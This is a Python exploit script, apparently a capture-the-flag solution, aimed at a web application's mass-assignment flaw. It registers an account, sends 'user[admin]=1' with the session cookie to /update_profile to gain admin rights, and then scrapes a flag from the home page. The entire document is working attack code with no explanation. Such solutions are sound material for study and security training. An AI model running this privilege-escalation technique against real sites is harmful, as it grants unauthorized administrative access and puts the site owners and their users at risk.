import requests
import re
import sys

GREEN = "\033[32m"
RED = "\033[91m"
RESET = "\033[0m"

if len(sys.argv) != 2:
    print(f"{RED}[-] Please provide a URL{RESET}")
    sys.exit(1)
else:
    url = sys.argv[1]

user = 'hacker'
user_data = {'user[username]': user, 'user[password]': user, 'submit': 'Submit Query'}
admin_flag = {'user[admin]': 1}

signup = requests.post(url + '/signup', data=user_data, allow_redirects=False)

if signup.status_code == 303:
    cookie = signup.headers['Set-Cookie'].split(';')[0]
    user_data.update(admin_flag)
    update_profile = requests.post(url + '/update_profile', data=user_data, headers={'Cookie': cookie}, allow_redirects=False)
    if update_profile.status_code == 303:
        request = requests.get(url + '/', headers={'Cookie': cookie})
        if request.status_code == 200:
            flag = re.search(r'[\da-f]*-[\da-f]*-[\da-f]*-[\da-f]*-[\da-f]*', request.text).group()
            print(f"[+] The flag for this challenge is {GREEN}{flag}{RESET}")
    else:
        print(f"{RED}[-] Something went wrong!{RESET}")
else:
    print(f"{RED}[-] Something went wrong!{RESET}")
